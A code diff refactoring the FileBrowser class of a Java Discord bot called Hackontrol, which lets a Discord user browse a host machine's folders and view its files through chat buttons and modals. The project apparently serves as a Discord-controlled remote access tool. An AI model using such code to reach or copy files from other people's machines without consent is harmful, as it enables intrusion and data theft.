@@ -8,19 +8,21 @@ import java.util.List;
 import java.util.Stack;
 
 import com.khopan.hackontrol.Hackontrol;
-import com.khopan.hackontrol.manager.button.ButtonContext;
-import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.manager.common.sender.IMessageable;
-import com.khopan.hackontrol.manager.common.sender.IRepliable;
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
-import com.khopan.hackontrol.manager.common.sender.sendable.ReplySendable;
-import com.khopan.hackontrol.manager.modal.ModalContext;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.InteractionManager;
+import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.sendable.ISendable;
+import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;
 
+import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
+import net.dv8tion.jda.api.interactions.Interaction;
+import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 import net.dv8tion.jda.api.interactions.modals.Modal;
@@ -29,8 +31,8 @@ import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
 import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
 import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
-public class FileBrowser {
-	static final String MODAL_VIEW = "view";
+public class FileBrowser<T extends IReplyCallback & Interaction> {
+	static final String MODAL_VIEW    = "view";
 	static final String MODAL_GO_INTO = "goInto";
 
 	File file;
@@ -41,12 +43,12 @@ public class FileBrowser {
 
 	private ButtonContext context;
 
-	private FileBrowser(IRepliable repliable, IMessageable messageable) {
+	private FileBrowser(T callback) {
 		this.fileList = new ArrayList<>();
 		this.folderList = new ArrayList<>();
 		this.stack = new Stack<>();
 		this.file = null;
-		this.send(repliable, messageable);
+		this.send(callback);
 	}
 
 	void modalView(ModalContext context) {
@@ -80,16 +82,16 @@ public class FileBrowser {
 		File file = this.folderList.get(index - fileSize - 1);
 		this.stack.push(this.file);
 		this.file = file;
-		this.send(context, context);
+		this.send(context);
 
 		if(this.context != null) {
 			HackontrolMessage.delete(this.context);
-			ButtonManager.deleteMessagesInParameters(this.context);
+			HackontrolButton.deleteMessagesInParameters(this.context);
 		}
 	}
 
 	private int checkModalCallback(ModalContext context, int start, int end) {
-		ModalMapping mapping = context.value("fileIndex");
+		ModalMapping mapping = context.getValue("fileIndex");
 
 		if(mapping == null) {
 			HackontrolError.message(context.reply(), "File index cannot be null");
@@ -146,11 +148,11 @@ public class FileBrowser {
 
 		this.stack.push(this.file);
 		this.file = this.folderList.get(0);
-		this.send(context, context);
+		this.send(context);
 
 		if(context != null) {
 			HackontrolMessage.delete(context);
-			ButtonManager.deleteMessagesInParameters(context);
+			HackontrolButton.deleteMessagesInParameters(context);
 		}
 	}
 
@@ -161,15 +163,15 @@ public class FileBrowser {
 		}
 
 		this.file = this.stack.pop();
-		this.send(context, context);
-		context.getChannel().deleteMessageById(context.getEvent().getMessageIdLong()).queue();
-		ButtonManager.deleteMessagesInParameters(context);
+		this.send(context);
+		HackontrolMessage.delete(context);
+		HackontrolButton.deleteMessagesInParameters(context);
 	}
 
 	private void buttonRefresh(ButtonContext context) {
-		this.send(context, context);
-		context.getChannel().deleteMessageById(context.getEvent().getMessageIdLong()).queue();
-		ButtonManager.deleteMessagesInParameters(context);
+		this.send(context);
+		HackontrolMessage.delete(context);
+		HackontrolButton.deleteMessagesInParameters(context);
 	}
 
 	private void modal(ButtonContext context, String identifier, String name, int start, int end) {
@@ -189,29 +191,30 @@ public class FileBrowser {
 
 	private void actionRow(MessageCreateRequest<?> request, boolean isRoot, Object... identifiers) {
 		List<ItemComponent> list = new ArrayList<>();
-		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "View", this :: buttonView));
+		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "View", this :: buttonView));
 
 		if(this.file == null || !this.folderList.isEmpty()) {
-			list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Go Into", this :: buttonGoInto, identifiers));
+			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Go Into", this :: buttonGoInto, identifiers));
 		}
 
 		if(!isRoot) {
-			list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Return", this :: buttonReturn, identifiers));
+			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Return", this :: buttonReturn, identifiers));
 		}
 
-		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Refresh", this :: buttonRefresh, identifiers));
+		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", this :: buttonRefresh, identifiers));
 		list.add(HackontrolButton.delete(identifiers));
 		request.addActionRow(list);
 	}
 
-	private void send(IRepliable repliable, IMessageable messageable) {
-		String fileText = this.buildFileText(this.file, ReplySendable.of(repliable));
+	@SuppressWarnings("hiding")
+	private <T extends IReplyCallback & Interaction> void send(T callback) {
+		String fileText = this.buildFileText(this.file, ReplyCallbackSendable.of(callback));
 
 		if(fileText == null) {
 			return;
 		}
 
-		List<String> messageList = this.splitMessage(fileText, ReplySendable.of(repliable));
+		List<String> messageList = this.splitMessage(fileText, ReplyCallbackSendable.of(callback));
 
 		if(messageList == null) {
 			return;
@@ -219,37 +222,38 @@ public class FileBrowser {
 
 		String firstMessage = messageList.get(0);
 		messageList.remove(0);
-		ReplyCallbackAction replyCallbackAction = repliable.reply(firstMessage);
+		ReplyCallbackAction replyCallbackAction = callback.reply(firstMessage);
 		boolean isRoot = this.file == null;
 
 		if(messageList.isEmpty()) {
 			this.actionRow(replyCallbackAction, isRoot);
-			replyCallbackAction.queue(ButtonManager :: dynamicButtonCallback);
+			replyCallbackAction.queue(InteractionManager :: callback);
 			return;
 		}
 
+		MessageChannel channel = (MessageChannel) callback.getChannel();
 		replyCallbackAction.queue(hook -> {
-			ButtonManager.dynamicButtonCallback(hook);
+			InteractionManager.callback(hook);
 			hook.retrieveOriginal().queue(message -> new Thread(() -> {
 				int size = messageList.size();
 				MessageCreateAction messageCreateAction;
 
 				if(size == 1) {
-					messageCreateAction = messageable.sendMessage(messageList.get(0));
+					messageCreateAction = channel.sendMessage(messageList.get(0));
 					this.actionRow(messageCreateAction, isRoot, message.getIdLong());
 				} else {
 					Object[] identifierList = new Object[size];
 					identifierList[0] = message.getIdLong();
 
 					for(int i = 1; i < size; i++) {
-						identifierList[i] = messageable.sendMessage(messageList.get(i - 1)).complete().getIdLong();
+						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
 					}
 
-					messageCreateAction = messageable.sendMessage(messageList.get(size - 1));
+					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
 					this.actionRow(messageCreateAction, isRoot, identifierList);
 				}
 
-				messageCreateAction.queue(ButtonManager :: dynamicButtonCallback);
+				messageCreateAction.queue(InteractionManager :: callback);
 			}).start());
 		});
 	}
@@ -349,7 +353,7 @@ public class FileBrowser {
 		return ordinal;
 	}
 
-	public static <T extends IRepliable & IMessageable> FileBrowser start(T sender) {
-		return new FileBrowser(sender, sender);
+	public static <T extends IReplyCallback & Interaction> FileBrowser<T> start(T callback) {
+		return new FileBrowser<>(callback);
 	}
 }
